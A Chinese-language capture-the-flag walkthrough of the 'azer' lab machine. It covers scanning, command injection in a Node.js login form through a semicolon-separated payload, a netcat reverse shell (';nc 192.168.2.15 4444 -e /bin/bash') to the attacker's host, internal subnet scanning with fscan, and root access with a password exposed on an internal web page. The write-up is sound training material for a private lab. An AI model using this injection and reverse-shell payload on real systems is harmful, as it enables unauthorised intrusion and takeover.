# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 21:40 EDT
Nmap scan report for azer (192.168.2.7)
Host is up (0.00036s latency).
MAC Address: 08:00:27:62:ED:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 2.73 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.7
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 21:41 EDT
Nmap scan report for azer (192.168.2.7)
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
3000/tcp open  http    Node.js (Express middleware)
MAC Address: 08:00:27:62:ED:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

# 漏洞利用

3000端口是一个登录页面，看看80能找到什么，目录枚举

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git -u http://192.168.2.7 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 40603]
/v6                   (Status: 301) [Size: 307] [--> http://192.168.2.7/v6/]
/ik                   (Status: 301) [Size: 307] [--> http://192.168.2.7/ik/]
/.html                (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 276]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

80端口没有发现哪里又可以利用的地方，看看3000端口

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.2.7:3000/login -d "username=admin&password=admin" 
Error executing bash script: Command failed: /home/azer/get.sh admin admin
fatal: not a git repository (or any of the parent directories): .git
```

登录逻辑不是靠数据库，而是/home/azer/get.sh username password，并且存在系统命令执行链：fatal: not a git repository

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.2.7:3000/login -d "username=admin;id&password=admin" 
Error executing bash script: Command failed: /home/azer/get.sh admin;id admin
fatal: not a git repository (or any of the parent directories): .git
id: ‘admin’: no such user
```

命令注入成立但回显有限，反弹一个shell

```
登录框：
;nc 192.168.2.15 4444 -e /bin/bash
nc 192.168.2.15 4444 -e /bin/bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.7] 42858
id
uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)
```

# 权限提升

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
azer@azer:~$
//寻找web下的文件
azer@azer:~$ find /var/www -name "*.php" 2>/dev/null
find /var/www -name "*.php" 2>/dev/null
azer@azer:~$ find /var/www -name "*.env" 2>/dev/null
find /var/www -name "*.env" 2>/dev/null
azer@azer:~$ find /var/www -name "*.conf" 2>/dev/null
find /var/www -name "*.conf" 2>/dev/null
azer@azer:~$ ls -la
ls -la
total 64
drwx------  5 azer azer  4096 Feb 21  2024 .
drwxr-xr-x  3 root root  4096 Feb 21  2024 ..
-rwxr-xr-x  1 azer azer    72 Feb 21  2024 get.sh
drwxr-xr-x 66 azer azer  4096 Feb 21  2024 node_modules
drwxr-xr-x  4 azer azer  4096 Feb 21  2024 .npm
-rw-r--r--  1 azer azer    53 Feb 21  2024 package.json
-rw-r--r--  1 azer azer 25336 Feb 21  2024 package-lock.json
-rw-r--r--  1 azer azer  1950 Feb 21  2024 server.js
drwxr-xr-x  2 azer azer  4096 Feb 21  2024 .ssh
-rw-------  1 azer azer    33 Feb 21  2024 user.txt
azer@azer:~/.ssh$ ls -la
ls -la
total 12
drwxr-xr-x 2 azer azer 4096 Feb 21  2024 .
drwx------ 5 azer azer 4096 Feb 21  2024 ..
-rw-r--r-- 1 azer azer  614 Feb 21  2024 known_hosts
//寻找提权路径
azer@azer:~$ sudo -l
sudo -l
bash: sudo: command not found
azer@azer:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
//发现存在内部服务
azer@azer:~$ ifconfig
ifconfig
br-333bcb432cd5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.1  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::42:74ff:fe4a:83bc  prefixlen 64  scopeid 0x20<link>
        ether 02:42:74:4a:83:bc  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 800 (800.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:b9:8e:5f:75  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.7  netmask 255.255.255.0  broadcast 192.168.2.255
        inet6 fe80::a00:27ff:fe62:ed7d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:62:ed:7d  txqueuelen 1000  (Ethernet)
        RX packets 21730912  bytes 3542846520 (3.2 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21709753  bytes 10498661018 (9.7 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 41583 (40.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 41583 (40.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethd1ecb25: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::4be:9aff:fed1:f2b2  prefixlen 64  scopeid 0x20<link>
        ether 06:be:9a:d1:f2:b2  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22  bytes 1780 (1.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
//使用fscan进行扫描
azer@azer:~$ ./fscan -h 10.10.10.0/24 -np
./fscan -h 10.10.10.0/24 -np
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1
                                                                      
[1.4s]     已选择服务扫描模式                                         
[1.4s]     开始信息扫描
[1.4s]     CIDR范围: 10.10.10.0-10.10.10.255
[1.4s]     generate_ip_range_full
[1.4s]     解析CIDR 10.10.10.0/24 -> IP范围 10.10.10.0-10.10.10.255
[1.4s]     最终有效主机数量: 256
[1.4s]     开始主机扫描
[1.4s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                                                                     
[1.4s]     有效端口数量: 233
[1.4s] [*] 端口开放 10.10.10.10:80
[1.4s] [*] 端口开放 10.10.10.1:3000
[1.4s] [*] 端口开放 10.10.10.1:80
azer@azer:~$ curl 10.10.10.10:80
curl 10.10.10.10:80
.:.AzerBulbul.:.
azer@azer:~$ su 
su
Password: .:.AzerBulbul.:.

root@azer:/home/azer# id
id
uid=0(root) gid=0(root) groups=0(root)
```
